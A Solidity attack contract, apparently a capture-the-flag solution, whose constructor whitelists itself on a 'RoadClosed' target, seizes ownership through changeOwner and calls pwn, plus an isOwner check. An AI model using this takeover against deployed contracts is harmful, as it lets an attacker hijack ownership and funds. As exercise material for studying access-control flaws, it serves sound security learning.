import "./RoadClosed.sol";

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

contract Hack {
    address public target;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
        RoadClosed(target).addToWhitelist(address(this));
        RoadClosed(target).changeOwner(address(this));
        RoadClosed(target).pwn(address(this));
    }

    function isOwner() external view returns (bool) {
        bool res = RoadClosed(target).isOwner();
        return res;
    }
}
